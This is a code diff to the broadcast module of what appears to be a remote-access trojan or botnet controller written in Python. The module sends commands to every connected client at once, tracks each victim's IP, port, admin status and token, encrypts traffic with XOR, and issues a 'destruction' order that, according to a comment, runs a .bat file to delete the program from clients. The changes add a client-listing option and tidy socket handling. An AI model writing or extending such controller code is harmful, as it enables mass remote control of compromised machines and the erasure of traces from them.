@@ -3,6 +3,7 @@ from .handler import Handler
 from .other import printColor
 from .other import XOREncryption
 from .other import areYouSure
+from .other import printAllTarget
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
 
 from .management import CheckConn
@@ -18,6 +19,8 @@ class Broadcast:
         '''-h or --help'''
         printColor("help","""
 -h or --help : Displays all session mode commands.
+
+-ls or --list : Displays all clients with their information.
 
 -c : Executes a command on all clients and does not send the result (don't forget to put the command in quotation marks). 
 
@@ -51,7 +54,9 @@ class Broadcast:
         self.broadcast_to_all_clients(cmd) #send command for all client
 
     def destruction_for_all_clients(self):
+        #Launches a process (.bat file) to delete the program and then exits the program. 
         printColor("information","\n[!] are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
+
         if(areYouSure()):
             request = "MOD_DESTRUCTION:broadcast"
             print("\n")
@@ -59,6 +64,12 @@ class Broadcast:
                 if(Handler.dict_conn[key][NB_ALIVE]):
                     if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
                         printColor("information","[-] Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
+                        
+                        try:
+                            Handler.dict_conn[key][NB_SOCKET].close()
+                        except:
+                            pass
+
                         CheckConn().connexionIsDead(key) 
 
                     else:
@@ -87,8 +98,6 @@ class Broadcast:
         else:
             request = data
 
-        print("request --->",request)
-
         for key in Handler.dict_conn.keys():
             if(Handler.dict_conn[key][NB_ALIVE]):
                 if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
@@ -101,7 +110,7 @@ class Broadcast:
 
     def main(self):
         if len(Handler.dict_conn) != 0:
-            printColor("information","[?] In MOD_BROADCAST")
+            printColor("information","[?] You are in MOD BROADCAST")
             printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
             
             while Broadcast.checker:
@@ -128,6 +137,9 @@ class Broadcast:
                         elif(forall[i] == "-c"):
                             self.executeCommand(forall)
                         
+                        elif(forall[i] == "-ls" or forall[i]=="--list"):
+                            printAllTarget()                            
+
                         else:
                             pass
 
